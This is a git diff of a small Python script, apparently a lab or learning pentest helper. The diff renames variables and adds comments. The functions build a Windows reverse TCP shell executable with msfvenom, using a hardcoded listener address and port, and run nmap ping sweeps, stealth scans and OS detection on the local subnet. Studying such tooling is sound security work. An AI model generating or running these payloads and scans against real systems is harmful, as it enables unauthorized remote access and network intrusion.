@@ -9,16 +9,16 @@ import socket # import the socket library
 
 ### HELPER FUNCTIONS ###
 def get_local():  # calls ifconfig
-    return_code = subprocess.run(['ifconfig'])
-    print("output:", return_code)
+    if_output = subprocess.run(['ifconfig']) # uses the subprocess function to run the ifconfig command
+    return if_output
 
 def list_payloads(): # lists all the msfvenom payloads
-    return_code = subprocess.run(['msfvenom','-l','payloads'])
-    print("output:", return_code)
+    msf_payloads = subprocess.run(['msfvenom','-l','payloads']) # uses the subprocess function to run the msfvenom function and get a list of the msfvenom payloads
+    return msf_payloads
 
 def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
-    return_code = subprocess.run(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
-    print("output:", return_code)
+    payload = subprocess.run(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe']) # payload creation with hardcoded options
+    return payload
 
 def get_ip(): # gets ip address of local computer
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -34,18 +34,18 @@ def get_subnet(): # gets the first three octets of the local hosts ipv4 address 
 
 def ping_sweep(): # does a sweep of the local network using nmap
     subnet = get_subnet()
-    return_code = subprocess.run(['nmap','-sP',subnet])
-    return return_code
+    sweep = subprocess.run(['nmap','-sP',subnet])
+    return sweep
     
 def ping_scan(): # does a stealth scan for machines with open ports in the local network using nmap
     subnet = get_subnet()
-    return_code = subprocess.run(['sudo','nmap','-sS',subnet])
-    return return_code
+    stealth_scan = subprocess.run(['sudo','nmap','-sS',subnet])
+    return stealth_scan
 
 def os_scan(): # tries to find the os of machines on the local network
     subnet = get_subnet()
-    return_code = subprocess.run(['sudo','nmap','-O',subnet])
-    return return_code
+    operating_systems = subprocess.run(['sudo','nmap','-O',subnet])
+    return operating_systems
 
 
 ### MAIN FUNCTION ###
